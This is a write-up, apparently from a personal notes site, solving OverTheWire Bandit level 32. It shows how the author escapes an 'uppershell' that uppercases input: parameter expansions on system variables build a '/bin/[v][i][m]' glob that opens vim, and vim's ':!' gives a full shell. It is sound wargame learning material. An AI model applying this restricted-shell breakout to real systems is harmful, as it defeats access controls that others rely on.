---
layout: base.njk
title: bandit32
tags:
  - t
  - x
  - writeup
  - txt
  - bandit
  - overthewire
  - good
---
#COMPSCI
from [[OverTheWire]], [[format string]], [[paremeter expansion]]



## Solution

### Facts about the uppershell

**Likely functioning of the uppershell:**

- It takes your input text as a string.
- For each character, it converts it to uppercase.
- It executes the resulting string with `sh -c '<string>'`.

Everything you type ends up in uppercase:

```
>> teste1
sh: 1: TESTE1: Permission denied
>> oioioooi
sh: 1: OIOIOOOI: Permission denied
>> "oioiooi"
sh: 1: OIOIOOI: Permission denied
```

**EXCEPT** for system-defined environment variables:

```
>> $PATH; $USER; $PWD
sh: 1: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin: not found
sh: 1: bandit32: Permission denied
sh: 1: /home/bandit32: Permission denied
>>
```

It is possible to define ephemeral environment variables. We can do things like:

```
>> teste=/bin/teste; $teste
sh: 1: /BIN/TESTE: not found
```

But if we define it on one line and call it on another, nothing happens:

```
sh: 1: /BIN/TESTE: not found
>> teste="oioi"
>> $teste
>>
```

The values inside the environment variables are also converted to uppercase, regardless of the string type:


```
>> t=a;$t;t1='a';$t1;t2="a";$t2
sh: 1: A: Permission denied
sh: 1: A: Permission denied
sh: 1: A: Permission denied
```

Trying to define the variable recursively doesn't work either:

```
>> a="a";b=$a;c=$b;$c
sh: 1: A: Permission denied
```

## Solution

It is possible to perform **parameter expansions** on system variables. This makes it possible to extract a piece of the string from the variable.

For example, the expansion `${PATH##*/}` strips out everything except the last `"bin"`. With this, I am already able to run executables (!), but without much success, since the glob matches are a bit too broad:

```
/${PATH##*/}/*
```

With this command, I execute **ALL** the executables in `bin`. I need to be able to run more specific things (ideally a script in `/tmp/dir`) or perhaps open a terminal, `vim`, `more`, or whatever.

After trying a lot, I managed to open `vim`. Basically, you can pattern match using individual characters from a string. Therefore, what we want to do is something like:


```
/bin/[v][i][m]
```

to successfully open `vim`. The problem is that we don't have direct access to lowercase letters. However, by utilizing words stored in the server's system variables, we can make the following spaghetti code:

```
var1=${SSH_TTY#/}; dev=${var1%%/*}; bin=${path##*/}; var2=${pwd%/*}; home=${var2#/}; vim=/$bin/[$dev][$bin]["$home"]; $vim
```

from there, we are able to access vim and execute commands using :!, thus getting a proper shell
difícil pra krl, mas eu estou muito feliz pqp

